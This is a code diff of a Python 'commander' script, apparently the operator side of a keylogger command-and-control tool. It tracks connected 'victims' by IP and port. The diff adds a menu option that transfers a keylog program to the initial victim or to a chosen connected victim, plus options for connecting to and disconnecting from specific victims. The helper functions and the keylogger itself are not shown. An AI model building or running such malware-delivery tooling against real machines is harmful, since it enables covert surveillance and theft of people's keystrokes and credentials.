@@ -1,9 +1,6 @@
-import constants
-from commander_utils import *
-import socket
+import hashlib
 import select
-import sys
-
+from commander_utils import *
 
 if __name__ == '__main__':
     # Initialization + GetOpts
@@ -21,7 +18,8 @@ if __name__ == '__main__':
 
     # Initial connect to victim as passed by argument (and put in sockets_to_read)
     print_config(destination_ip, destination_port, (source_ip, source_port))
-    connect_to_client(sockets_to_read, connected_clients, destination_ip, destination_port)
+    is_connected, victim_socket = initial_connect_to_client(sockets_to_read, connected_clients,
+                                                            destination_ip, destination_port)
 
     # Display Menu
     display_menu()
@@ -38,44 +36,41 @@ if __name__ == '__main__':
             if sock is server_socket:
                 # This means there is a new incoming connection
                 client_socket, client_address = server_socket.accept()
-                print("[+] New connection from:", client_address)
+                print(constants.NEW_CONNECTION_MSG.format(client_address))
                 sockets_to_read.append(client_socket)
-
-                # Add the new client socket to the connected_clients dictionary
                 connected_clients[client_socket] = client_address
 
             # b) Read from stdin file descriptor (Initiate Menu from keystroke)
             elif sock is sys.stdin:
-                if command == constants.PERFORM_MENU_ITEM_FIVE:  # Disconnect from victim
-                    disconnect_from_client(sockets_to_read, connected_clients,
-                                           destination_ip, destination_port)
+                # MENU ITEM 3 - Transfer keylog program to victim
+                if command == constants.PERFORM_MENU_ITEM_THREE:
+                    # To send to initial victim (from command arg)
+                    if is_connected and len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
+                        transfer_file(victim_socket, destination_ip, destination_port)
 
-                if command == "connect":  # a) For connecting to a new victim
-                    target_ip = input("[+] Enter victim IP address: ")
-                    target_port = int(input("[+] Enter victim port: "))
-                    connect_to_client(sockets_to_read, connected_clients, target_ip, target_port)
+                    # If connected to no clients => Connect to one and transfer
+                    elif len(connected_clients) == constants.ZERO:
+                        print(constants.NO_CONNECTED_CLIENTS_ERROR)
 
-                if command == "send":  # b) For sending things to a specific victim
-                    target_socket = None
-                    target_ip = input("[+] Enter target IP address: ")
-                    target_port = int(input("[+] Enter target port: "))
-                    msg = input(f"[+] Type what you want to send to {target_ip} on port {target_port}: ")
+                    # Send keylogger to any specific connected victim
+                    elif len(connected_clients) != constants.ZERO:
+                        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
+                        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
+                        target_socket, target_ip, target_port = find_specific_client_socket(connected_clients,
+                                                                                            target_ip, target_port)
+                        if target_socket:
+                            transfer_file(target_socket, target_ip, target_port)
+                        else:
+                            print(constants.TARGET_VICTIM_NOT_FOUND)
 
-                    # Find a specific client socket from client socket list to send data to
-                    for client_sock, (ip, port) in connected_clients.items():
-                        if ip == target_ip and port == target_port:
-                            target_socket = client_sock
-                            break
+                # MENU ITEM 5 - Disconnect from victim
+                if command == constants.PERFORM_MENU_ITEM_FIVE:
+                    disconnect_from_client(sockets_to_read, connected_clients)
 
-                    if target_socket:
-                        try:
-                            # Send the message to the target client
-                            target_socket.send(msg.encode())
-                            print("[+] Sent to", (target_ip, target_port), ":", msg)
-                        except Exception as e:
-                            print("[+] Error sending to", (target_ip, target_port), ":", str(e))
-                    else:
-                        print("[+] ERROR: Target client not found!")
+                # MENU ITEM 12 - Connect to a specific victim
+                if command == constants.PERFORM_MENU_ITEM_TWELVE:
+                    _, target_socket, target_ip, target_port = connect_to_client_with_prompt(sockets_to_read,
+                                                                                             connected_clients)
 
             #  c) If not server or stdin sockets, then handle data coming from clients
             else:
